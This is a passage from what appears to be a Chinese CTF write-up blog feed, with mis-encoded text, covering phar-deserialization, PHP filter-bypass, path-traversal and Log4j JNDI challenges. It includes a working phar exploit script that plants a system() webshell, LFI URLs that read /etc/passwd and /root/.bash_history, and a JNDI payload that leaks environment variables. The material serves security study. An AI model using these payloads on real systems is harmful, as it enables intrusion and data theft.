&lt;p>åªè¦æŠŠxffå¤´æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶åï¼Œç„¶åŽéšä¾¿ä¸€ä¸ªå‚æ•°åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼ˆåœ¨$_SERVERSæ•°ç»„ä¸­ï¼‰ï¼Œå†è®©pageå‚æ•°è®¾ä¸º&lt;code>data:amiz/profile&lt;/code>ï¼Œåšåˆ°&lt;code>file_get_contents&lt;/code>ä¸è®¤ ä½†æ˜¯includeè®¤ï¼Œå¯ä»¥è®©å®ƒç›´æŽ¥åŒ…å«è¿™ä¸ªæ–‡ä»¶&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211153020891.png" alt="image-20211211153020891">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211153240826.png" alt="image-20211211153240826">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ha1c9on.top/2020/05/13/phuck2/">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ç½‘é¼Žæ¯ 2020 æ€»å†³èµ›]Game Exp
&lt;/h4>
&lt;/summary>
&lt;p>ç»™äº†æºç ï¼Œéžå¸¸å¤šï¼Œç»“åˆé¡µé¢åŠŸèƒ½çœ‹ä»£ç ï¼›é¦–å…ˆæ˜¯æ³¨å†Œï¼Œæœ‰ä¸ªå¾ˆå¥‡æ€ªçš„å•ç‹¬çš„ç±»&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119001928719.png" alt="image-20220119001928719">&lt;/p>
&lt;p>å¾ˆæ˜¾ç„¶éœ€è¦ä¸€ä¸ªååºåˆ—åŒ–ç‚¹è§¦å‘AnyClassçš„&lt;code>eval()&lt;/code>ï¼Œç»“åˆæ³¨å†Œåœ°æ–¹ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹+&lt;code>file_exists&lt;/code>å‡½æ•°ï¼Œå¾ˆæ˜¾ç„¶æ˜¯pharååºåˆ—åŒ–äº†ï¼Œè€Œpharæœ¬æ¥å°±å¯¹åŽç¼€åä¸æ•æ„Ÿï¼ˆä¸»è¦çœ‹å†…å®¹ï¼‰ï¼Œæ‰€ä»¥ç›´æŽ¥ç”¨phar.jpgå³å¯ï¼Œ&lt;code>$filename&lt;/code>æ˜¯æ‹¼æŽ¥çš„ç”¨æˆ·åå’ŒåŽç¼€&lt;/p>
&lt;p>exp.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">AnyClass&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#111">$output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;echo &amp;#34;ok&amp;#34;;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">output&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">AnyClass&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;system($_GET[1]);&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æ³¨æ„è¿™é‡Œæ˜¯å•å¼•å·
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exp.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¿®æ”¹åŽç¼€å’ŒMIMEä¸Šä¼ ï¼Œè·¯å¾„æ˜¯/login/amiz.jpgï¼ˆæ˜¯ç”¨æˆ·å&lt;/p>
&lt;p>å†å›žåˆ°æ³¨å†Œä¸Šä¼ é‚£é‡Œï¼Œä¿®æ”¹ç”¨æˆ·åä¸º&lt;code>php://amiz&lt;/code>ï¼Œç„¶åŽGETå‚æ•°è§¦å‘shellå³å¯&lt;/p>
&lt;/details></description></item><item><title>CTFshow1221æ‘†çƒ‚æ¯ Wp</title><link>https://amiaaaz.github.io/2021/12/28/ctfshow-1221-bailancup-wp/</link><pubDate>Tue, 28 Dec 2021 20:06:48 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/28/ctfshow-1221-bailancup-wp/</guid><description>&lt;p>&lt;a href="https://ctf.show/challenges">https://ctf.show/challenges&lt;/a>&lt;/p>
&lt;h2 id="webç­¾åˆ°">webç­¾åˆ°&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224183707592.png" alt="image-20211224183707592">&lt;/p>
&lt;p>ä¸€çœ¼flaskï¼Œç®€å•fuzzä¸€ä¸‹å‘çŽ°è¿‡æ»¤äº†å­—æ¯ æ–œæ  å¼•å· æ³¨é‡Šç¬¦ èŠ±æ‹¬å· ç™¾åˆ†å· ç‚¹å·&lt;/p>
&lt;p>æ²¡è¿‡æ»¤çš„è¿˜æœ‰æ‹¬å·å’ŒåŠ å‡ä¹˜é™¤&lt;/p>
&lt;pre tabindex="0">&lt;code>A: 114)+(0
B: 1
C: -1
&lt;/code>&lt;/pre>&lt;h2 id="ä¸€è¡Œä»£ç ">ä¸€è¡Œä»£ç &lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-
&lt;/span>&lt;span style="color:#75715e"># @Author: h1xa
&lt;/span>&lt;span style="color:#75715e"># @Date: 2021-11-18 21:25:22
&lt;/span>&lt;span style="color:#75715e"># @Last Modified by: h1xa
&lt;/span>&lt;span style="color:#75715e"># @Last Modified time: 2021-11-18 22:14:12
&lt;/span>&lt;span style="color:#75715e"># @email: h1xa@ctfer.com
&lt;/span>&lt;span style="color:#75715e"># @link: https://ctfer.com
&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">*/&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag.php&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#75af00">stripos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;filename&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">!=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">eregi&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ctfsho&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#d88200">&amp;#34;ctfshow&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;filename&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;welcome2ctfshow&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">str_repeat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çŽ°åœ¨éƒ½çˆ±è¿™ç§ä¸€è¡Œæµäº†ï¼Ÿ&lt;/p>
&lt;p>æ•´ä½“æ˜¯ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¦‚æžœå‰é¢çš„è¡¨è¾¾å¼æ•´ä½“ä¸ºçœŸåˆ™è¿”å›ž$flagï¼Œè€Œå¤–é¢åˆå¥—äº†&lt;code>!()&lt;/code>ï¼Œæ‰€ä»¥éœ€è¦æ‹¬å·å†…éƒ¨ä¸ºå‡ï¼Œè€Œåˆéƒ½æ˜¯&lt;code>||&lt;/code>è¿žæŽ¥ï¼Œæ‰€ä»¥éœ€è¦æ¯ä¸ªå°æ‹¬å·è‡ªå·±éƒ½ä¸ºå‡ï¼ŒæŒ¨ä¸ªçœ‹çœ‹&lt;/p>
&lt;ul>
&lt;li>&lt;code>$_GET['id']!=0&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>ç»™idèµ‹å€¼ä¸º0æˆ–è€…ç›´æŽ¥ç•™ç©º&lt;/p>
&lt;ul>
&lt;li>&lt;code>strlen($_GET['content'])&amp;lt;=7&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>contenté•¿äºŽ7&lt;/p>
&lt;ul>
&lt;li>&lt;code>!eregi(&amp;quot;ctfsho&amp;quot;.substr($_GET['content'],0,1),&amp;quot;ctfshow&amp;quot;)&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>æ²¡åŒ¹é…ä¸ºå‡ï¼Œåˆ™åŒ¹é…ä¸ºçœŸï¼Œcontent=wwwwwww&lt;/p>
&lt;ul>
&lt;li>&lt;code>substr($_GET['content'],0,1)=='w'&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>æŠŠcontentæ”¹ä¸ªå¤§å†™&lt;/p>
&lt;ul>
&lt;li>&lt;code>file_get_contents($_GET['filename'],'r') !== &amp;quot;welcome2ctfshow&amp;quot;&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>ç”¨data://ä¼ªåè®®&lt;/p>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>?id=0&amp;amp;content=Wwwwwwww&amp;amp;filename=data://text/plain,welcome2ctfshow
&lt;/code>&lt;/pre>&lt;h2 id="é»‘å®¢ç½‘ç«™">é»‘å®¢ç½‘ç«™&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224210814499.png" alt="image-20211224210814499">&lt;/p>
&lt;p>æºç æç¤º flagä¸åœ¨è¿™ä¸ªæœåŠ¡å™¨ä¸Šï¼Œä¸ç”¨æ‰«æï¼Œä¸ç”¨æ¸—é€&lt;/p>
&lt;p>çœ‹å­—ç¬¦ä¸²æœ«å°¾æœ‰onionï¼Œæ‹¼åœ¨ä¸€èµ·&lt;/p>
&lt;pre tabindex="0">&lt;code>http://tyros4qws3mmbubgjqje46ncv35jaqjgeb3nqiuf23ijoj4zwasxohyd.onion
&lt;/code>&lt;/pre>&lt;p>è®¿é—®å°±è¡Œäº†æ~&lt;/p>
&lt;h2 id="ç™»é™†ä¸äº†">***ç™»é™†ä¸äº†&lt;/h2>
&lt;p>åœ¨éªŒè¯ç çš„åœ°æ–¹æœ‰ä¸ªå‚æ•°ï¼Œå°è¯•æ–‡ä»¶åŒ…å«&lt;/p>
&lt;pre tabindex="0">&lt;code>http://bf986069-fc4e-42a3-b09b-c966f9e17a3c.challenge.ctf.show/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3d%3d
&lt;/code>&lt;/pre>&lt;p>é›€é£Ÿæœ‰/etc/passwdï¼Œä½†æ˜¯çœ‹ä¸äº†/flagï¼Œçœ‹ä¸€ä¸‹åˆ«çš„ä¸œè¥¿&lt;/p>
&lt;pre tabindex="0">&lt;code># /root/.bash_history
/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vcm9vdC8uYmFzaF9oaXN0b3J5
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224202852805.png" alt="image-20211224202852805">&lt;/p>
&lt;p>å¥½å§ï¼Œç«Ÿç„¶æ˜¯javaï¼Œå…ˆçˆ¬äº†&lt;/p></description></item><item><title>hxpCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/12/20/hxpctf2021-wp/</link><pubDate>Mon, 20 Dec 2021 23:45:08 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/20/hxpctf2021-wp/</guid><description>&lt;p>&lt;a href="https://2021.ctf.link/internal/challenges">https://2021.ctf.link/internal/challenges&lt;/a>&lt;/p>
&lt;h2 id="log-4-sanity-check">Log 4 sanity check&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.pdf?__blob=publicationFile&amp;amp;v=6">ALARM ALARM&lt;/a>&lt;/p>
&lt;p>nc 65.108.176.77 1337&lt;/p>
&lt;/blockquote>
&lt;p>çœ‹åˆ°log4jçš„ç¬¬ä¸€ååº”æ˜¯æ‹¿JNDIé‚£ä¸ªå·¥å…·ç›´æŽ¥æ¢­ï¼Œä½†æ˜¯å‘çŽ°å¼¹ä¸å‡ºæ¥shellï¼ˆä¸ç®¡æ˜¯bash ncè¿˜æ˜¯curl wgetè¿™äº› å°è¯•äº†å‘çŽ°éƒ½ä¸è¡Œï¼‰ï¼Œä½†æ˜¯æ˜¾ç„¶éœ€è¦ä¸€ä¸ªrceæˆ–è€…æ˜¯æ–‡ä»¶è¯»å–çš„ç‚¹ï¼Œå†ä»”ç»†çœ‹dockerfileå‘çŽ°flagå·²ç»è¢«è¯»åˆ°çŽ¯å¢ƒå˜é‡ä¸­äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220003006386.png" alt="image-20211220003006386">&lt;/p>
&lt;p>å””ï¼Œæ‰€ä»¥ç›´æŽ¥è¯»ä¸€ä¸‹æœ¬åœ°çŽ¯å¢ƒå˜é‡ä¸­çš„flag&lt;/p>
&lt;pre tabindex="0">&lt;code>${jndi:ldap://127.0.0.1/${env:FLAG}}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220002554929.png" alt="image-20211220002554929">&lt;/p>
&lt;p>&lt;code>hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}&lt;/code>&lt;/p>
&lt;h2 id="unzipper">unzipper&lt;/h2>
&lt;blockquote>
&lt;p>Here, let me unzip that for you.&lt;/p>
&lt;p>http://65.108.176.76:8200/&lt;/p>
&lt;/blockquote>
&lt;p>index.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">or&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session_start&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">??=&lt;/span> &lt;span style="color:#75af00">bin2hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;data/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$lock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#39;.lock&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">or&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fopen&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">flock&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$lock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">LOCK_EX&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#75af00">LOCK_NB&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">or&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0700&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">or&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;chdir&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ulimit -v 8192 &amp;amp;&amp;amp; /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . &amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">escapeshellarg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;tmp_name&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/(^$|flag)/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">realpath&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">?:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">readfile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$lock&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹åˆ°zipæƒ³åˆ°è‚¯å®šè·Ÿè½¯é“¾æŽ¥è¯»æ–‡ä»¶æœ‰å…³ï¼ˆä½†æ˜¯è¿™ç§å§¿åŠ¿æ²¡æœ‰è§è¿‡ï¼Œå­¦åˆ°äº†&lt;/p>
&lt;p>è¿™é‡Œå®žçŽ°äº†ä¸¤ä¸ªåŠŸèƒ½ï¼Œé¦–å…ˆæ˜¯unzip POSTä¸Šä¼ çš„zipæ–‡ä»¶ï¼Œå¦ä¸€ä¸ªæ˜¯å¯¹GETçš„fileå‚æ•°è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œå¹¶ä¸”å¯¹å‚æ•°è¿›è¡Œäº†&lt;code>realpath()&lt;/code>çš„å¤„ç†ï¼Œå®ƒä¼šè§£æžè½¯é“¾æŽ¥çš„è·¯å¾„ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªæ­£åˆ™åŒ¹é…è¦æ±‚ä¸èƒ½æœ‰flagï¼ˆå¤§å°å†™ä¸æ•æ„Ÿï¼‰ï¼Œä¹‹åŽå¯ä»¥é€šè¿‡&lt;code>readfile()&lt;/code>è¯»æ–‡ä»¶ï¼Œå‚æ•°æ˜¯ä¸ç»è¿‡æ»¤çš„file&lt;/p>
&lt;p>&lt;code>readfile&lt;/code>æœ‰ä¸€ä¸ªç‰¹æ€§æ˜¯æŽ¥å—urlè·¯å¾„çš„å‚æ•°ï¼Œæ¯”å¦‚&lt;code>file:///flag.txt&lt;/code>ï¼Œä¼šå°†å…¶è§†ä½œurlåŽ»è¯»å–&lt;code>/flag.txt&lt;/code>ï¼Œè€Œ&lt;code>realpath&lt;/code>ä¼šå°†å…¶è§†ä½œ&lt;code>file:&lt;/code>æ–‡ä»¶å¤¹ä¸‹çš„&lt;code>flag.txt&lt;/code>æ–‡ä»¶&lt;/p>
